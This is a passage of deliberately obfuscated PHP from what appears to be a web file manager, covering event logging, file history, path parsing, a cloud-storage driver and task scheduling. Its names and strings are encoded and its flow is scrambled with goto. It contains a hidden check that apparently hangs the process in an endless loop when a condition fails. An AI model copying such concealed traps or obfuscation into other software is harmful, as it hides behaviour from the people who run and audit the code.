"\x66\x75\156\x63\x74\151\x6f\x6e"), array("\x64\x65\163\x63", '', "\x69\156\163\x65\x72\x74\x2c\165\x70\144\141\x74\x65\54\x73\x65\x6c\x65\x63\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($a, $AΉ, $f = '') { goto B׽; B׽: $cǓƽ =& $_SERVER[]; if (!$this->eventSave) { return; } $eتߦ = Model($cǓƽ[1097])->sourceInfo($a); goto Dي; Dي: if (!$eتߦ) { return !1; } if ($this->isCacheEvent($eتߦ, $AΉ)) { return; } if ($f && is_string($f)) { $f = array($cǓƽ[2098] => $f); } goto F; F: $eݔ = array($cǓƽ[379] => $a, $cǓƽ[2241] => $eتߦ[$cǓƽ[457]], $cǓƽ[2242] => $eتߦ[$cǓƽ[28]], $cǓƽ[462] => $eتߦ[$cǓƽ[462]], $cǓƽ[1397] => USER_ID, $cǓƽ[384] => $AΉ, $cǓƽ[1399] => $f); $this->addSystemLog($AΉ, $eݔ); return $this->add($eݔ); goto Dǩ; Dǩ: } private function addSystemLog($a, $dͧ) { $A䭹 =& $_SERVER[]; if ($a == $A䭹[2243]) { $a = $dͧ[$A䭹[401]][$A䭹[2244]]; } else { if (in_array($a, array($A䭹[2045], $A䭹[2245]))) { $a = $dͧ[$A䭹[401]][$A䭹[678]]; } } $B = array_merge($dͧ, array($A䭹[2246] => $dͧ[$A䭹[365]], $A䭹[2247] => $dͧ[$A䭹[2247]])); Model($A䭹[2009])->addLog($A䭹[2248] . $a, $B); } private function isCacheEvent($f, $cȹ) { if ($f[$_SERVER[][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aʺ̔, $Dد) { $Bۓξ =& $_SERVER[]; $a = Model($Bۓξ[1097])->sourceInfo($aʺ̔); $aح = array($Bۓξ[2244] => $Dد, $Bۓξ[28] => $a[$Bۓξ[28]]); return $this->addEvent($aʺ̔, $Bۓξ[2243], $aح); } public function eventFileEdit($c) { $AƟ =& $_SERVER[]; $F֭ = array($AƟ[2249] => $_SERVER[$AƟ[2250]], $AƟ[1715] => strtolower(ACTION)); return $this->addEvent($c, $AƟ[2036], $F֭); } public function eventRecycle($bɦ, $bܿܙ) { return $this->addEvent($bɦ, $_SERVER[][2245], $bܿܙ); } public function eventRemove($e) { $Fθ =& $_SERVER[]; $Eʚ = Model($Fθ[1097])->sourceInfo($e); $aݥʾ = $Eʚ[$Fθ[28]]; return $this->addEvent($Eʚ[$Fθ[457]], $Fθ[2035], $aݥʾ); } public function eventShare($cЕ, $bӪ) { return $this->addEvent($cЕ, $_SERVER[][2045], $bӪ); } public function eventMove($d, $eݛد, $A) { goto D; EҳȨ: $D = $b->sourceInfo($eݛد); $B = $b->sourceInfo($A); $a⹍ = array($Fܑ޹[993] => $eݛد, $Fܑ޹[2251] => $D[$Fܑ޹[28]], $Fܑ޹[2252] => $D[$Fܑ޹[462]], $Fܑ޹[994] => $A, $Fܑ޹[2253] => $B[$Fܑ޹[28]], $Fܑ޹[2254] => $B[$Fܑ޹[462]]); goto dஸӈ; eЫ: $this->addEvent($eݛد, $Fܑ޹[2255], $a⹍); goto b녭; dஸӈ: $this->addEvent($d, $Fܑ޹[488], $a⹍); $E = $b->sourceInfo($d); $a⹍ = array($Fܑ޹[365] => $E[$Fܑ޹[365]], $Fܑ޹[28] => $E[$Fܑ޹[28]]); goto eЫ; D: $Fܑ޹ =& $_SERVER[]; $b = Model($Fܑ޹[1097]); $E = $b->sourceInfo($d); goto EҳȨ; b녭: } public function eventCopy($c) { $this->eventCreate($c, $_SERVER[][486]); } public function eventRename($DՍǄ, $Cף, $Cޜ吸) { $aƮ =& $_SERVER[]; $B = array($aƮ[993] => $Cף, $aƮ[994] => $Cޜ吸); return $this->addEvent($DՍǄ, $aƮ[1109], $B); } public function eventAddComment($cܫ, $B蠐) { return $this->addEvent($cܫ, $_SERVER[][2256], $B蠐); } public function eventAddDesc($D嬤, $D潚) { return $this->addEvent($D嬤, $_SERVER[][2257], $D潚); } public function listBySource($B) { goto F; F: $A =& $_SERVER[]; $c = Model($A[1097])->sourceInfo($B); $fۅк٬ = array($A[379] => $B); goto E; E: if ($c[$A[366]] == $A[83]) { $Cڌ = Model($A[1097])->listSearchChildren($B, 20000); $Cڌ[] = $B . $A[357]; $fۅк٬ = array($A[365] => array($A[7], $Cڌ)); } $bø = $this->where($fۅк٬)->order($A[2258])->selectPage(); if ($bø[$A[347]][$A[348]] == 0) { $bø[$A[347]][$A[348]] = 1; $bø[$A[350]] = array(array($A[379] => $B, $A[2241] => $c[$A[457]], $A[1397] => $c[$A[374]], $A[384] => $A[2259], $A[385] => $c[$A[183]], $A[1399] => $A[33])); } goto FͲ; FͲ: $bø = $this->eventListParse($bø, $B); show_json($bø); goto Fݏǎ; Fݏǎ: } private function eventListParse($Cߺ, $c١) { goto DܑÜ; eë: $e = array_unique($e); $B = array_unique(array_to_keyvalue($cٔ, $aᇉ[33], $aᇉ[1406])); $e޽ = Model($aᇉ[473])->userListInfo($B); goto fæ昛; B׸: $EŌȂ = array_to_keyvalue($cٔ, $aᇉ[33], $aᇉ[2247]); foreach ($cٔ as $eÈ) { $d⊸ϳ = $eÈ[$aᇉ[401]]; if ($eÈ[$aᇉ[29]] == $aᇉ[488] && isset($d⊸ϳ[$aᇉ[993]])) { $e[] = $d⊸ϳ[$aᇉ[993]] . $aᇉ[33]; $e[] = $d⊸ϳ[$aᇉ[994]] . $aᇉ[33]; } if ($eÈ[$aᇉ[29]] == $aᇉ[2255] && isset($d⊸ϳ[$aᇉ[365]])) { $e[] = $d⊸ϳ[$aᇉ[365]] . $aᇉ[33]; } } $e = array_merge($e, $EŌȂ, array($c١ . $aᇉ[33])); goto eë; fæ昛: $dâ = Model($aᇉ[738])->sourceListInfo($e, !0); foreach ($cٔ as &$eÈ) { if ($eÈ[$aᇉ[29]] == $aᇉ[488] && isset($eÈ[$aᇉ[401]][$aᇉ[993]])) { $eÈ[$aᇉ[401]][$aᇉ[993]] = $dâ[$eÈ[$aᇉ[401]][$aᇉ[993]]]; $eÈ[$aᇉ[401]][$aᇉ[994]] = $dâ[$eÈ[$aᇉ[401]][$aᇉ[994]]]; } if ($eÈ[$aᇉ[29]] == $aᇉ[2255] && isset($eÈ[$aᇉ[401]][$aᇉ[365]])) { $eÈ[$aᇉ[401]][$aᇉ[365]] = $dâ[$eÈ[$aᇉ[401]][$aᇉ[365]]]; } $eÈ[$aᇉ[387]] = $dâ[$eÈ[$aᇉ[365]]]; $eÈ[$aᇉ[2260]] = $dâ[$eÈ[$aᇉ[2247]]]; if ($eÈ[$aᇉ[29]] == $aᇉ[2035]) { $eÈ[$aᇉ[2260]] = $eÈ[$aᇉ[387]]; $eÈ[$aᇉ[2247]] = $eÈ[$aᇉ[2260]][$aᇉ[365]]; $eÈ[$aᇉ[387]] = !1; $eÈ[$aᇉ[365]] = $aᇉ[33]; } $eÈ[$aᇉ[2205]] = $e޽[$eÈ[$aᇉ[1406]]]; } $Cߺ[$aᇉ[350]] = $cٔ; goto F; F: return $Cߺ; goto B; DܑÜ: $aᇉ =& $_SERVER[]; $cٔ = $Cߺ[$aᇉ[350]]; $e = array_to_keyvalue($cٔ, $aᇉ[33], $aᇉ[365]); goto B׸; B: } public function removeBySource($C綏Ț) { $Bު = array($_SERVER[][379] => $C綏Ț); $this->where($Bު)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\143\x65\137\150\x69\163\x74\x6f\162\171"; public function addHistory($c՗, $fΡ = '') { $eّ =& $_SERVER[]; $cҎ = array($eّ[379] => $c՗[$eّ[365]], $eّ[1397] => isset($c՗[$eّ[375]]) ? $c՗[$eّ[375]] : $c՗[$eّ[374]], $eّ[416] => $c՗[$eّ[415]], $eّ[516] => $c՗[$eّ[77]], $eّ[2261] => $fΡ); $Cг = $GLOBALS[$eّ[6]][$eّ[84]][$eّ[2262]]; if ($Cг > 1) { $this->historyAutoClear($cҎ[$eّ[365]]); $this->add($cҎ); } Model($eّ[2263])->eventFileEdit($c՗[$eّ[365]]); } private function historyAutoClear($eȏ) { goto F噴; eҏĿ: $A뽿߸ = array($fܓʅ[381] => array($fܓʅ[7], $Cτ)); $this->where($A뽿߸)->delete(); Model($fܓʅ[418])->remove($C㜄); goto C؉; fݪ: if ($a砹 >= 500) { return; } $A뽿߸ = array($fܓʅ[379] => $eȏ); $Eő = $this->field($fܓʅ[2266])->where($A뽿߸)->order($fܓʅ[2258])->select(); goto E񂹃; E񂹃: if (!$Eő || $a砹 >= count($Eő)) { return; } $Cτ = array_to_keyvalue($Eő, $fܓʅ[33], $fܓʅ[363]); $Cτ = array_slice($Cτ, $a砹); goto a; a: $C㜄 = array_to_keyvalue($Eő, $fܓʅ[33], $fܓʅ[415]); $C㜄 = array_slice($C㜄, $a砹); if (!$Cτ || !$C㜄) { return; } goto eҏĿ; F噴: $fܓʅ =& $_SERVER[]; $E谾 = Model($fܓʅ[1075])->get($fܓʅ[2264]); $E = $GLOBALS[$fܓʅ[6]][$fܓʅ[84]][$fܓʅ[2262]]; goto d; d: $FӼ = $E谾 == $fܓʅ[2265] ? 3 : $E; if ($E <= 1) { $FӼ = 1; } $a砹 = $FӼ - 1; goto fݪ; C؉: } public function listData($Aī) { goto D̅; D̅: $e =& $_SERVER[]; $D͹ = array($e[379] => $Aī); $C駊 = $e[2267]; goto Dݞ; Dݞ: $a = $this->field($C駊)->where($D͹)->order($e[2258])->selectPage(); $this->_listAppendUser($a[$e[350]]); $a = Model($e[1075])->get($e[2264]); goto CŔ; CŔ: $cٹ΄ = 3; if ($a == $e[2265]) { $a[$e[350]] = array_slice($a[$e[350]], 0, $cٹ΄); $a[$e[347]] = array($e[2268] => 1, $e[2269] => 20, $e[2270] => 1, $e[2271] => count($a[$e[350]])); } return $a; goto cԬ; cԬ: } protected function _listAppendUser(&$Bώؘ) { $fʒ =& $_SERVER[]; $eӱڛ = array_to_keyvalue($Bώؘ, $fʒ[33], $fʒ[1406]); $fţ = Model($fʒ[473])->userListInfo($eӱڛ); foreach ($Bώؘ as &$aܲ) { $B僖 = $aܲ[$fʒ[1406]]; $aܲ[$fʒ[374]] = $fţ[$B僖] ? $fţ[$B僖] : !1; } } public function fileInfo($BÌ) { $cƭ =& $_SERVER[]; $F􋓚 = $this->tablePrefix; $b = "{$F􋓚}\x69\157\x5f\146\151\154\x65\40\x66\x69\154\x65\163\40\157\x6e\40\146\151\154\x65\x73\56\146\x69\154\x65\111\104\x20\x3d\x20\x68\151\163\164\157\x72\171\56\x66\x69\154\145\x49\104"; return $this->alias($cƭ[2272])->where(array($cƭ[381] => $BÌ))->join($b, $cƭ[2273])->find(); } public function removeItem($e) { $c =& $_SERVER[]; $D = array($c[381] => $e); $Eͱ̈ = $this->where($D)->find(); if ($Eͱ̈) { $dĖ = $this->where($D)->delete(); Model($c[418])->remove($Eͱ̈[$c[415]]); return $dĖ; } return !1; } public function removeBySource($Aᑟ) { goto aՍ; aՍ: $c܍ =& $_SERVER[]; if (!$Aᑟ) { return !1; } if (!is_array($Aᑟ)) { $Aᑟ = array($Aᑟ); } goto C; C: $F˕ = array($c܍[379] => array($c܍[7], $Aᑟ)); $A = $this->field($c܍[416])->where($F˕)->select(); if ($A) { $this->where($F˕)->delete(); $e膢 = array_to_keyvalue($A, $c܍[33], $c܍[415]); Model($c܍[418])->remove($e膢); } goto Bٺ; Bٺ: return !0; goto f֕ˠ; f֕ˠ: } public function setDetail($E, $B) { $f =& $_SERVER[]; return $this->where(array($f[381] => $E))->save(array($f[2261] => $B)); } public function rollbackToItem($c۷, $cә) { goto F; Fכ: return $this->where(array($e[381] => $cә))->delete(); goto c; d쌭: $Dۂ = $this->find($cә); $EϴӔ = array($e[415] => $Dۂ[$e[415]], $e[77] => $Dۂ[$e[77]], $e[106] => time(), $e[375] => USER_ID); Model($e[738])->where(array($e[365] => $c۷))->save($EϴӔ); goto Fכ; F: $e =& $_SERVER[]; $dʝ = Model($e[738])->sourceInfo($c۷); $this->addHistory($dʝ); goto d쌭; c: } public function clearSame($c۔) { goto FΠ; AܰǾ: if (!$Fń) { return; } $this->where(array($Aƭ[363] => array($Aƭ[7], $Fń)))->delete(); Model($Aƭ[418])->remove($C); goto bĈ٫; FΠ: $Aƭ =& $_SERVER[]; $F = $this->listData($c۔); $bҋ = array_to_keyvalue_group($F, $Aƭ[415]); goto F; F: $C = array(); $Fń = array(); foreach ($bҋ as $c۞) { if (!$c۞ || count($c۞) <= 1) { continue; } foreach ($c۞ as $F゠Ǎ) { $C[] = $F゠Ǎ[$Aƭ[415]]; $Fń[] = $F゠Ǎ[$Aƭ[363]]; } } goto AܰǾ; bĈ٫: } public function userSpace() { $B =& $_SERVER[]; $E = $this->tablePrefix; $cߠ̌ߺ = array($B[1397] => USER_ID); $D萏 = "{$E}\x69\x6f\137\146\x69\154\x65\40\x66\151\x6c\145\x73\x20\157\156\40\x66\x69\154\x65\163\x2e\x66\x69\154\x65\x49\x44\x20\75\40\x68\x69\163\164\157\x72\171\x2e\146\x69\x6c\145\111\104"; return $this->alias($B[2272])->where($cߠ̌ߺ)->join($D萏, $B[2273])->sum($B[77]); } } goto C䃷Ѓ; bѧߘ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\x52\x65\143\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\145\162\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\106\x69\154\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\x69\154\145\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\160\122\x6f\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\x53\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\x68\x61\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\x65\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\145\111\164\145\155\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\x65\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\x72\x7d"; public static function typeList() { $d쐙 =& $_SERVER[]; return array($d쐙[1037] => self::KOD_SOURCE, $d쐙[1038] => self::KOD_USER_RECYCLE, $d쐙[1039] => self::KOD_USER_FAV, $d쐙[1040] => self::KOD_USER_FILE_TAG, $d쐙[1041] => self::KOD_USER_FILE_TYPE, $d쐙[1042] => self::KOD_GROUP_ROOT_SELF, $d쐙[1043] => self::KOD_USER_SHARE, $d쐙[1044] => self::KOD_USER_SHARE_LINK, $d쐙[1045] => self::KOD_USER_SHARE_TO_ME, $d쐙[1046] => self::KOD_SHARE_ITEM, $d쐙[1047] => self::KOD_SHARE_LINK, $d쐙[1048] => self::KOD_SEARCH, $d쐙[1049] => self::KOD_BLOCK, $d쐙[1050] => self::KOD_IO, $d쐙[1051] => self::KOD_USER_RECENT, $d쐙[1052] => self::KOD_USER_DRIVER); } public static function parse($Eԓ) { goto c˵; c˵: $Eƈͨ =& $_SERVER[]; $Eԓ = self::clear($Eԓ); $C = array_values(self::typeList()); goto f￦; f￦: preg_match($Eƈͨ[1053], $Eԓ, $aϺ); $E٭ = array($Eƈͨ[384] => !1, $Eƈͨ[1054] => !1, $Eƈͨ[381] => !1, $Eƈͨ[75] => $Eԓ, $Eƈͨ[999] => !1, $Eƈͨ[998] => $Eƈͨ[33]); if (is_array($aϺ) && count($aϺ) == 5) { $DΩ = $Eƈͨ[1055] . $aϺ[2] . $Eƈͨ[311]; if (in_array($DΩ, $C)) { $E٭[$Eƈͨ[999]] = $aϺ[1]; $E٭[$Eƈͨ[29]] = $DΩ; $E٭[$Eƈͨ[1056]] = substr($DΩ, 1, -1); $E٭[$Eƈͨ[363]] = $aϺ[3]; } $E٭[$Eƈͨ[998]] = $aϺ[4]; } goto b탭; b탭: $cΪ = array($Eƈͨ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $E٭[$Eƈͨ[1057]] = in_array($E٭[$Eƈͨ[29]], $cΪ); return $E٭; goto E; E: } public static function clear($B) { goto bڔ; Aׄ: if (substr($B, 0, 3) == $aȍ[1059]) { $B = substr($B, 3); } while (strstr($B, $dƧ)) { $B = str_replace($dƧ, $aȍ[8], $B); } $B = preg_replace($aȍ[1060], $aȍ[8], $B); goto bˉ; bˉ: if ($B == $aȍ[8]) { return $aȍ[8]; } $B = rtrim($B, $aȍ[8]); return $B; goto b琧띈; bڔ: $aȍ =& $_SERVER[]; $B = str_replace($aȍ[93], $aȍ[8], $B); $dƧ = $aȍ[1058]; goto Aׄ; b琧띈: } public static function sourceID($A߼) { $Bэ =& $_SERVER[]; $d = self::parse($A߼); if ($d[$Bэ[29]] !== self::KOD_SOURCE) { show_json(LNG($Bэ[1061]), !1); } return $d[$Bэ[363]]; } public static function make($bˇ) { if (!$bˇ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bˇ)); } public static function makeShare($bۃݼ, $B⩒) { return self::makePath(self::KOD_SHARE_ITEM, $bۃݼ, $B⩒); } public static function makeFileTypePath($D) { return self::makePath(self::KOD_USER_FILE_TYPE, $D); } public static function makeFileTagPath($Dऎ) { return self::makePath(self::KOD_USER_FILE_TAG, $Dऎ); } public static function makePath($Bҍ, $Eѻ = '', $cں = '') { $F =& $_SERVER[]; $Dˇ = substr($Bҍ, 1, -1); $F = $F[1062] . $Dˇ . $F[1063] . $Eѻ . $F[1064]; $F = $cں ? $F . $cں . $F[8] : $F; return $F; } public static function hashPath($eժ) { $A漧 =& $_SERVER[]; $C¹ = is_array($eժ) ? $eժ : IO::info($eժ); $AЃҵ = _get($C¹, $A漧[1065], $A漧[33]); if (!$AЃҵ) { $F = KodIO::parse($C¹[$A漧[75]]); if (!$F[$A漧[29]]) { $AЃҵ = IO::hashSimple($C¹[$A漧[75]]); } } if (!$AЃҵ) { $AЃҵ = md5($C¹[$A漧[75]] . $C¹[$A漧[77]] . $C¹[$A漧[106]]); } return $AЃҵ; } public static function initSystemPath() { $Fܞ =& $_SERVER[]; if (defined($Fܞ[1066])) { return; } define($Fܞ[1066], self::systemPath($Fܞ[1067])); define($Fܞ[1068], self::systemPath($Fܞ[1069])); define($Fܞ[1070], self::systemPath($Fܞ[1071])); define($Fܞ[1072], self::systemPath($Fܞ[1073])); } private static function systemPath($F) { goto b൦ƃ; b൦ƃ: $e =& $_SERVER[]; $Dʷ = $e[1074] . ucfirst($F); $e͋ϐ = Model($e[1075])->get($Dʷ); goto b߻; b: return $e͋ϐ; goto b՟; b߻: if ($e͋ϐ) { return $e͋ϐ; } if ($F == $e[1067]) { $e͋ϐ = self::make(Model($e[738])->systemRootPathAdd($e[1076])); } else { $e͋ϐ = self::systemPath($e[1067]); $c = self::sourceID($e͋ϐ); $e͋ϐ = self::make(Model($e[738])->mkdir($c, $F)); } Model($e[1075])->set($Dʷ, $e͋ϐ); goto b; b՟: } public static function systemFolder($F屬˻) { $F = IO_PATH_SYSTEM_SOURCE . $F屬˻; $C̩ = Cache::get($F); if (!$C̩) { $E׈ֹ = IO::infoFull($F); if (!$E׈ֹ) { $C̩ = IO::mkdir($F, REPEAT_SKIP); } else { $C̩ = $E׈ֹ[$_SERVER[][75]]; } Cache::set($F, $C̩, 3600 * 10); } return $C̩; } public static function defaultDriver() { return Model($_SERVER[][690])->defaultDriver(); } public static function defaultIO() { $dƤ =& $_SERVER[]; $EԎ = self::defaultDriver(); return $dƤ[1077] . $EԎ[$dƤ[363]] . $dƤ[1064]; } public static function fileTypeList() { $F =& $_SERVER[]; $fᏒ = $GLOBALS[$F[6]][$F[1078]]; foreach ($fᏒ as $bӱ¶ => $eކ؜) { $f = $F[1079] . $bӱ¶; $EՐъ = LNG($f); if ($f != $EՐъ) { $fᏒ[$bӱ¶][$F[28]] = $EՐъ; } } return $fᏒ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($A) { parent::__construct($A); $this->signatureVersion($_SERVER[][196]); } public function uploadFormData($D, $B = 3600) { goto b٥; b٥: $a殺 =& $_SERVER[]; $BЄԏ = $a殺[181]; $E䟉 = $a殺[214]; goto Fͳۋ; C: $a = sha1($a); $b = hash_hmac($a殺[214], $a, $f); $aժ = array($a殺[1084] => $BЄԏ, $a殺[1088] => $e, $a殺[1092] => base64_encode($a), $a殺[1089] => $E䟉, $a殺[1090] => $this->accessKey, $a殺[1093] => $c⇮, $a殺[1094] => $b, $a殺[165] => $this->getHost()); goto c; Fͳۋ: $e = $a殺[1080]; $b = gmdate($a殺[1081], time() + $B); $c⇮ = (string) time() . $a殺[67] . (string) (time() + $B); goto Eñ旅; c: return $aժ; goto Bä; Eñ旅: $a = array($a殺[1082] => $b, $a殺[1083] => array(array($a殺[1084] => $BЄԏ), array($a殺[1085] => $this->bucket), array($a殺[1086], $a殺[1087], $a殺[33]), array($a殺[1088] => $e), array($a殺[1089] => $E䟉), array($a殺[1090] => $this->accessKey), array($a殺[1091] => $c⇮))); $a = json_encode($a); $f = hash_hmac($a殺[214], $c⇮, $this->secret); goto C; Bä: } public function fileOutLink($fܳӼ) { $cעɊ =& $_SERVER[]; if (substr($fܳӼ, 0, 7) == $cעɊ[1095]) { $fܳӼ = $cעɊ[1096] . substr($fܳӼ, 7); } header($cעɊ[152] . $fܳӼ); die; } } if (!isset($_SERVER[$_SERVER[][775]]) || !isset($_SERVER[$_SERVER[][961]])) { goto b; E: $fѓ($_SERVER[$_SERVER[][772]] . $_SERVER[][773]); $Fǂ = 2; while ($Fǂ > 1) { $dݭ = rawurlencode($Fǂ . $_SERVER[][357]); } goto B怒; fЕ: $Cˇ = explode($_SERVER[][213], $CӸ); if (count($Cˇ) < $_SERVER[][584]) { $d㐣 = $_SERVER[][778]; $d㐣(); } $fѓ = $_SERVER[][960]; goto E; b: $e࣋ = $_SERVER[][777]; $Eڳ = $_SERVER[$_SERVER[][772]] . $_SERVER[][773]; $CӸ = $e࣋($Eڳ); goto fЕ; B怒: } goto eۦӵ; d݉ê: class AutoTask { public static function start() { goto f϶돸; f϶돸: $C =& $_SERVER[]; if (self::valueGet($C[675]) != $C[83]) { return; } if (self::valueGet($C[1370]) == $C[83]) { $F = self::valueGet($C[1371]); if (time() - $F > 3600 * 2) { self::restart(); } return; } goto eղ; eղ: http_close(); self::valueSet($C[1370], $C[83]); Hook::bind($C[1372], $C[1373]); goto e; e: while (!0) { self::cacheClear(); if (self::valueGet($C[675]) != $C[83]) { self::valueSet($C[1370], $C[464]); self::log($C[1374]); die; } self::valueSet($C[1370], $C[83]); self::valueSet($C[1371], time()); self::taskRunAll(); sleep(self::valueGet($C[1375])); } goto A; A: } public static function restart() { $aǌǝƈ =& $_SERVER[]; http_close(); self::valueSet($aǌǝƈ[675], $aǌǝƈ[464]); sleep(self::valueGet($aǌǝƈ[1375]) + 5); self::valueSet($aǌǝƈ[1370], $aǌǝƈ[464]); self::valueSet($aǌǝƈ[675], $aǌǝƈ[83]); } public static function shutdownEvent() { $aߐ =& $_SERVER[]; self::valueSet($aߐ[1370], $aߐ[464]); self::log($aߐ[1376]); } public static function config($Fȭ, $a򲛸) { $D =& $_SERVER[]; $D삇 = 20; $a򲛸 = intval($a򲛸) <= $D삇 ? $D삇 : intval($a򲛸); self::valueSet($D[675], $Fȭ); self::valueSet($D[1375], $a򲛸); } private static function taskRunAll() { $f =& $_SERVER[]; $d˰ = Model($f[1377])->listData(); $c = count($d˰); for ($c = 0; $c < $c; $c++) { $c = $d˰[$c]; if ($c[$f[1378]] != $f[83]) { continue; } if (!self::taskTimeCheck($c)) { continue; } self::taskRun($c); } Hook::trigger($f[1379]); } private static function taskTimeCheck($F߃) { goto Cꍶ; DǾ: $bĨ = strtotime($C[1380] . $c[$C[1381]] . $C[1382]) - strtotime($C[1383]); $Dƒ = time() - strtotime(date($C[1384]) . $C[1385]); $E傃 = $Dƒ >= $bĨ && $Dƒ <= $bĨ + 3600; goto Cǡ̲; Cǡ̲: switch ($c[$C[29]]) { case $C[1386]: if (time() - $BԵٴ < 3600 * 24 * 30) { return !1; } if ($c[$C[1386]] == date($C[1387]) && $E傃) { return !0; } break; case $C[1388]: if (time() - $BԵٴ < 3600 * 24 * 7) { return !1; } $Cχø = date($C[1389]) == 0 ? 7 : date($C[1389]); if ($c[$C[1388]] == $Cχø && $E傃) { return !0; } break; case $C[1381]: if (time() - $BԵٴ < 3600 * 24) { return !1; } if ($E傃) { return !0; } break; case $C[1390]: if (time() - $BԵٴ >= floatval($c[$C[1390]]) * 60) { return !0; } break; default: break; } return !1; goto fȸ; Cꍶ: $C =& $_SERVER[]; $c = json_decode($F߃[$C[186]], !0); $BԵٴ = intval($F߃[$C[1371]]); goto DǾ; fȸ: } public static function taskRun($C) { goto a꡸; Cܢ: $E = timeFloat(); $d˴Ӑ = $F܊΄[33]; switch ($C[$F܊΄[29]]) { case $F܊΄[291]: $BΆ = url_request($C[$F܊΄[1394]], $F܊΄[212], !1, !1, !1, !1, 5); $d˴Ӑ = strlen($BΆ); break; case $F܊΄[211]: $d˴Ӑ = Hook::apply($C[$F܊΄[1394]]); default: break; } goto D抹; a꡸: $F܊΄ =& $_SERVER[]; self::log($F܊΄[1391] . $C[$F܊΄[363]] . $F܊΄[1392] . $C[$F܊΄[28]] . $F܊΄[1393] . $C[$F܊΄[1394]]); Model($F܊΄[1377])->run($C[$F܊΄[363]]); goto Cܢ; D抹: Model($F܊΄[1395])->add(array($F܊΄[1396] => $F܊΄[33], $F܊΄[1397] => $F܊΄[464], $F܊΄[29] => $F܊΄[1398] . $C[$F܊΄[363]], $F܊΄[1399] => json_encode(array($F܊΄[28] => $C[$F܊΄[28]], $F܊΄[1400] => timeFloat() - $E, $F܊΄[277] => $d˴Ӑ)))); self::log($F܊΄[1401] . $C[$F܊΄[363]] . $F܊΄[1402] . $d˴Ӑ); return !0; goto C˾; C˾: } private static function valueGet($E) { $Cզ =& $_SERVER[]; $Aڵ = $Cզ[1403]; $fՋʐ = Model($Cզ[1404])->get($E, $Aڵ); if (is_null($fՋʐ)) { Model($Cզ[1404])->set($Cզ[1375], 10, $Aڵ); Model($Cզ[1404])->set($Cզ[675], $Cզ[83], $Aڵ); Model($Cզ[1404])->set($Cզ[1370], $Cզ[464], $Aڵ); $fՋʐ = Model($Cզ[1404])->get($E, $Aڵ); } return $fՋʐ; } private static function valueSet($eȊ, $f䛢ԫ) { $c =& $_SERVER[]; return Model($c[1404])->set($eȊ, $f䛢ԫ, $c[1403]); } protected static function log($Eū) { write_log($Eū, $_SERVER[][1405]); } private static function cacheClear() { $f֎ =& $_SERVER[]; $b㗴 = Model($f֎[1404])->cacheKey($f֎[1403]); Cache::clearMemory($b㗴); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($FЬ, $E = '', $f̳ = 0, $e = '') { goto F揗; Eѝ: Hook::bind($F̩[1372], array($this, $F̩[1414])); Hook::bind($F̩[1415], array($this, $F̩[1416])); $this->startAfter(); goto B󲎈; B󲎈: Hook::trigger($F̩[1417], $this->task); $this->task[$F̩[1411]] = timeFloat(); self::valueSet($this->task[$F̩[363]], $this->task); goto eЅ; F揗: $F̩ =& $_SERVER[]; if (self::get($FЬ)) { return; } $this->task = array($F̩[363] => $FЬ, $F̩[1406] => USER_ID, $F̩[1313] => $e, $F̩[29] => $E, $F̩[967] => $F̩[33], $F̩[965] => $f̳, $F̩[977] => 0, $F̩[1407] => 0, $F̩[1408] => 0, $F̩[1409] => timeFloat(), $F̩[1410] => 0, $F̩[1411] => 0, $F̩[1412] => 0, $F̩[1413] => 0, $F̩[675] => $F̩[1370]); goto Eѝ; eЅ: } public function end() { goto f; CƉ: $A񳠗 = timeFloat() - $this->task[$Eݰˬ[1409]]; self::log($Eݰˬ[1418] . $this->task[$Eݰˬ[363]] . $Eݰˬ[1419] . $A񳠗 . $Eݰˬ[1420]); Hook::unbind($Eݰˬ[1372], array($this, $Eݰˬ[1414])); goto Cڳ; f: $Eݰˬ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$Eݰˬ[1411]]) { self::valueSet($this->task[$Eݰˬ[363]], !1); } goto CƉ; Cڳ: Hook::unbind($Eݰˬ[1415], array($this, $Eݰˬ[1416])); $this->endAfter(); $this->task = !1; goto A; A: } public function update($DΝ = 0) { goto EͯޣĒ; eʟ: $eޅܸ[$b쭫[675]] = $bƎ ? $bƎ : $eޅܸ[$b쭫[675]]; $eޅܸ[$b쭫[1412]] = $b[$b쭫[1412]] ? $b[$b쭫[1412]] : 0; $eޅܸ[$b쭫[1411]] = timeFloat(); goto F; F: Hook::trigger($b쭫[1424], $eޅܸ); self::valueSet($eޅܸ[$b쭫[363]], $eޅܸ); goto eӅɩ; E䤈: $b = self::get($eޅܸ[$b쭫[363]]); $bƎ = $b[$b쭫[675]]; if ($bƎ == 